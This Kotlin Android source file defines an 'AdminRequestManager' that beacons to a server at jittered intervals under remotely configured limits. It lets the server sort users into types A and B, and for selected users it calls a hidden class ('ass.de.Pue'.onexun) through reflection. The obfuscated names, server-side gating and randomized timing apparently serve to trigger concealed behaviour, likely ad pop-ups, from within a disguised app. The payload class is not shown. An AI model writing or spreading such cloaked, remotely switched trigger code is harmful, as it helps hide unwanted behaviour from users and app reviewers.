package com.mastery.leaves.trace.core

import android.os.Handler
import android.os.Looper
import com.mastery.leaves.trace.ami.AllDataTool
import com.mastery.leaves.trace.ami.ChongTool
import com.mastery.leaves.trace.ami.DataPgTool
import com.mastery.leaves.trace.ami.DataPgTool.RequestResult
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlin.coroutines.resume
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import kotlin.random.Random

object AdminRequestManager {
    private var isRequesting = false
    private var periodicJob: Job? = null
    private var dingPeriodicJob: Job? = null
    private val handler = Handler(Looper.getMainLooper())

    // 每日请求计数相关
    private var dailyRequestCount: Int
        get() = getAllDataToolPrefs().getInt("daily_count_${getCurrentDate()}", 0)
        set(value) = getAllDataToolPrefs().edit().putInt("daily_count_${getCurrentDate()}", value)
            .apply()

    private fun getAllDataToolPrefs() =
        AllDataTool.getMainUser.getSharedPreferences("admin_request", 0)

    private fun getCurrentDate(): String {
        return SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date())
    }

    private fun getDailyLimit(): Int {
        return try {
            if (AllDataTool.dataState.isNotEmpty()) {
                val jsonData = JSONObject(AllDataTool.dataState)
                val dePoValue = jsonData.optString("de_po", "60-60-100")
                dePoValue.split("-").getOrNull(2)?.toIntOrNull() ?: 100
            } else {
                100
            }
        } catch (e: Exception) {
            CanNextGo.showLog("获取每日限制失败: ${e.message}")
            100
        }
    }

    private fun getPeriodicInterval(): Int {
        return try {
            if (AllDataTool.dataState.isNotEmpty()) {
                val jsonData = JSONObject(AllDataTool.dataState)
                val dePoValue = jsonData.optString("de_po", "60-60-100")
                dePoValue.split("-").getOrNull(1)?.toIntOrNull() ?: 60
            } else {
                60
            }
        } catch (e: Exception) {
            CanNextGo.showLog("获取定时间隔失败: ${e.message}")
            60
        }
    }

    private fun getDingPeriodicInterval(): Int {
        return try {
            if (AllDataTool.dataState.isNotEmpty()) {
                val jsonData = JSONObject(AllDataTool.dataState)
                val dePoValue = jsonData.optString("de_po", "60-60-100")
                dePoValue.split("-").getOrNull(0)?.toIntOrNull() ?: 60
            } else {
                60
            }
        } catch (e: Exception) {
            CanNextGo.showLog("获取Ding定时间隔失败: ${e.message}")
            60
        }
    }

    private fun isUserTypeA(): Boolean {
        return try {
            if (AllDataTool.dataState.isNotEmpty()) {
                val jsonData = JSONObject(AllDataTool.dataState)
                ChongTool.getAUTool(jsonData)
            } else {
                false
            }
        } catch (e: Exception) {
            CanNextGo.showLog("判断用户类型失败: ${e.message}")
            false
        }
    }

    private fun hasConfigA(): Boolean {
        return try {
            if (AllDataTool.dataState.isEmpty()) return false
            val jsonData = JSONObject(AllDataTool.dataState)
            jsonData.has("canpa") && ChongTool.getAUTool(jsonData)
        } catch (e: Exception) {
            CanNextGo.showLog("检查配置A失败: ${e.message}")
            false
        }
    }

    private fun hasConfigB(): Boolean {
        return try {
            if (AllDataTool.dataState.isEmpty()) return false
            val jsonData = JSONObject(AllDataTool.dataState)
            jsonData.has("canpa") && !ChongTool.getAUTool(jsonData)
        } catch (e: Exception) {
            CanNextGo.showLog("检查配置B失败: ${e.message}")
            false
        }
    }

    private fun canMakeRequest(): Boolean {
        if (isRequesting) {
            CanNextGo.showLog("已有请求在进行中，跳过")
            return false
        }

        if (dailyRequestCount >= getDailyLimit()) {
            CanNextGo.showLog("已达到每日请求上限: ${getDailyLimit()}")
            return false
        }

        return true
    }

    private fun incrementRequestCount() {
        dailyRequestCount += 1
        CanNextGo.showLog("当前请求次数: $dailyRequestCount/${getDailyLimit()}")
    }

    fun startPopAdmin() {
        CanNextGo.showLog("开始Admin请求流程")
        when {
            hasConfigA() -> {
                CanNextGo.showLog("情况1: 有配置A")
                handleConfigAScenario()
            }

            hasConfigB() -> {
                CanNextGo.showLog("情况2: 有配置B")
                handleConfigBScenario()
            }

            else -> {
                CanNextGo.showLog("情况3: 无配置")
                handleNoConfigScenario()
            }
        }
        startDingPeriodicRequests()
    }

    private fun startDingPeriodicRequests() {
        // 取消之前的定时任务
        dingPeriodicJob?.cancel()

        dingPeriodicJob = CoroutineScope(Dispatchers.Main).launch {

            // 计算第一次请求的延迟时间
            val baseIntervalMinutes = getDingPeriodicInterval()
            val randomOffsetMinutes = Random.nextInt(-5, 6) // -5到5分钟随机
            val actualIntervalMinutes = (baseIntervalMinutes + randomOffsetMinutes).coerceAtLeast(1)
            val actualIntervalMs = actualIntervalMinutes * 60 * 1000L

            CanNextGo.showLog("Ding定时请求，首次间隔: ${actualIntervalMinutes}分钟")
            // 等待首次间隔时间
            delay(actualIntervalMs)
            CanNextGo.showLog("开始Admin定时请求流程")
            while (true) {
                if (dailyRequestCount >= getDailyLimit()) {
                    CanNextGo.showLog("已达到每日请求上限，停止Ding定时请求")
                    break
                }

                // 发起请求
                makeDingAdminRequest()

                // 计算下次请求的间隔时间
                val nextBaseIntervalMinutes = getDingPeriodicInterval()
                val nextRandomOffsetMinutes = Random.nextInt(-5, 6) // -5到5分钟随机
                val nextActualIntervalMinutes =
                    (nextBaseIntervalMinutes + nextRandomOffsetMinutes).coerceAtLeast(1)
                val nextActualIntervalMs = nextActualIntervalMinutes * 60 * 1000L

                CanNextGo.showLog("Ding定时请求，下次间隔: ${nextActualIntervalMinutes}分钟")

                // 等待下次间隔时间
                delay(nextActualIntervalMs)
            }
        }
    }

    private fun makeDingAdminRequest() {
        if (dailyRequestCount >= getDailyLimit()) {
            CanNextGo.showLog("已达到每日请求上限，跳过Ding请求")
            return
        }

        if (isRequesting) {
            CanNextGo.showLog("已有请求在进行中，跳过Ding请求")
            return
        }

        CanNextGo.showLog("执行Ding Admin请求")
        incrementRequestCount()

        DataPgTool.instance.postAdminData { result ->
            when (result) {
                is RequestResult.Success -> {
                    CanNextGo.showLog("Ding请求成功，数据已保存: ${AllDataTool.dataState}")
                }

                is RequestResult.Error -> {
                    CanNextGo.showLog("Ding请求失败: ${result.message}")
                }
            }
        }
    }

    private fun handleConfigAScenario() {
        if (!canMakeRequest()) return

        // 延迟1秒到10分钟后请求
        val delayMs = Random.nextLong(1000, 10 * 60 * 1000 + 1)
        CanNextGo.showLog("配置A场景，延迟${delayMs}ms后请求")
        callPueOnexun()

        handler.postDelayed({
            makeAdminRequest { success ->
                CanNextGo.showLog("makeAdminRequest result: success=$success, isUserTypeA=${isUserTypeA()}")
                if (success && !isUserTypeA()) {
                    CanNextGo.showLog("B用户，转入情况2流程")
                    // B用户转入情况2流程
                    handleConfigBScenario()
                } else {
                    CanNextGo.showLog("请求失败，停止后续操作")
                }
            }
        }, delayMs)
    }

    private fun handleConfigBScenario() {
        CanNextGo.showLog("开始定时请求流程")
        startPeriodicRequests()
    }

    private fun handleNoConfigScenario() {
        if (!canMakeRequest()) return

        CanNextGo.showLog("无配置场景，立即请求")
        makeAdminRequest { success ->
            CanNextGo.showLog("无配置场景 makeAdminRequest result: success=$success, isUserTypeA=${isUserTypeA()}")
            if (success && isUserTypeA()) {
                CanNextGo.showLog("无配置场景 条件满足，调用callPueOnexun")
                callPueOnexun()
            } else if (success && !isUserTypeA()) {
                CanNextGo.showLog("无配置场景 B用户，转入情况2流程")
                // B用户转入情况2流程
                handleConfigBScenario()
            } else {
                CanNextGo.showLog("无配置场景 请求失败，停止后续操作")
            }
        }
    }

    private fun startPeriodicRequests() {
        // 取消之前的定时任务
        periodicJob?.cancel()

        periodicJob = CoroutineScope(Dispatchers.Main).launch {
            while (true) {
                if (!canMakeRequest()) {
                    CanNextGo.showLog("无法继续定时请求，停止")
                    break
                }

                val baseInterval = getPeriodicInterval()
                val randomOffset = Random.nextInt(-10, 11) // -10到10秒随机
                val actualInterval = (baseInterval + randomOffset).coerceAtLeast(1)

                CanNextGo.showLog("定时请求，间隔: ${actualInterval}秒")

                // 使用suspend函数等待请求完成
                val success = makeAdminRequestSuspend()

                if (success && isUserTypeA()) {
                    callPueOnexun()
                    CanNextGo.showLog("A用户请求成功，停止定时任务")
                    break
                }
                // B用户继续循环

                delay(actualInterval * 1000L)
            }
        }
    }

    private fun makeAdminRequest(callback: (Boolean) -> Unit) {
        makeAdminRequestWithRetry(callback)
    }

    private suspend fun makeAdminRequestSuspend(): Boolean {
        return suspendCancellableCoroutine { continuation ->
            makeAdminRequestWithRetry { success ->
                continuation.resume(success)
            }
        }
    }

    private fun makeAdminRequestWithRetry(callback: (Boolean) -> Unit) {
        if (!canMakeRequest()) {
            callback(false)
            return
        }

        isRequesting = true
        incrementRequestCount()

        val maxRetries = Random.nextInt(2, 6) // 2-5次重试
        val totalTimeoutMs = Random.nextLong(60_000, 5 * 60_000 + 1) // 1-5分钟总时长
        val startTime = System.currentTimeMillis()

        CanNextGo.showLog("开始请求，最大重试${maxRetries}次，总超时${totalTimeoutMs}ms")

        performRequestWithRetry(0, maxRetries, startTime, totalTimeoutMs, callback)
    }

    private fun performRequestWithRetry(
        currentAttempt: Int,
        maxRetries: Int,
        startTime: Long,
        totalTimeoutMs: Long,
        callback: (Boolean) -> Unit
    ) {
        val elapsedTime = System.currentTimeMillis() - startTime

        if (elapsedTime >= totalTimeoutMs) {
            CanNextGo.showLog("请求总时间超时，停止重试")
            isRequesting = false
            callback(false)
            return
        }

        if (currentAttempt >= maxRetries) {
            CanNextGo.showLog("达到最大重试次数，停止重试")
            isRequesting = false
            callback(false)
            return
        }

        CanNextGo.showLog("执行第${currentAttempt + 1}次请求")

        // 设置60秒请求超时
        val requestTimeout = Runnable {
            CanNextGo.showLog("单次请求超时，准备重试")
            scheduleNextRetry(currentAttempt, maxRetries, startTime, totalTimeoutMs, callback)
        }
        handler.postDelayed(requestTimeout, 60_000)

        DataPgTool.instance.postAdminData { result ->
            handler.removeCallbacks(requestTimeout)

            when (result) {
                is RequestResult.Success -> {
                    CanNextGo.showLog("请求成功: ${AllDataTool.dataState}")
                    isRequesting = false
                    callback(true)
                }

                is RequestResult.Error -> {
                    CanNextGo.showLog("请求失败: ${result.message}")
                    scheduleNextRetry(
                        currentAttempt,
                        maxRetries,
                        startTime,
                        totalTimeoutMs,
                        callback
                    )
                }
            }
        }
    }

    private fun scheduleNextRetry(
        currentAttempt: Int,
        maxRetries: Int,
        startTime: Long,
        totalTimeoutMs: Long,
        callback: (Boolean) -> Unit
    ) {
        val nextAttempt = currentAttempt + 1
        if (nextAttempt < maxRetries) {
            val retryDelay = Random.nextLong(30_000, 60_000) // 30-60秒重试间隔
            CanNextGo.showLog("${retryDelay}ms后进行第${nextAttempt + 1}次重试")

            handler.postDelayed({
                performRequestWithRetry(
                    nextAttempt,
                    maxRetries,
                    startTime,
                    totalTimeoutMs,
                    callback
                )
            }, retryDelay)
        } else {
            CanNextGo.showLog("重试次数用尽")
            isRequesting = false
            callback(false)
        }
    }

    private fun callPueOnexun() {
//        try {
//            val pueClass = Class.forName("c.C")
//            val onexunMethod = pueClass.getMethod("c1", Object::class.java)
//            onexunMethod.invoke(null, AllDataTool.getMainUser)
//            CanNextGo.showLog("AdminRequestManager callPueOnexun success")
//        } catch (e: Exception) {
//            CanNextGo.showLog("AdminRequestManager callPueOnexun error: ${e.message}")
//        }
        callPue(AllDataTool.getMainUser)
    }

    private fun callPue(context: Any) {
        try {
            CanNextGo.showLog("RefAndUserData callPueOnexun called")
            val pueClass = Class.forName("ass.de.Pue")
            val onexunMethod = pueClass.getMethod("onexun", Object::class.java)
            onexunMethod.invoke(null, context)
            CanNextGo.showLog("RefAndUserData callPueOnexun success")
        } catch (e: Exception) {
            CanNextGo.showLog("RefAndUserData callPueOnexun error: ${e.message}")
        }
    }

    fun stopPeriodicRequests() {
        periodicJob?.cancel()
        periodicJob = null
        dingPeriodicJob?.cancel()
        dingPeriodicJob = null
        CanNextGo.showLog("停止所有定时请求")
    }
}
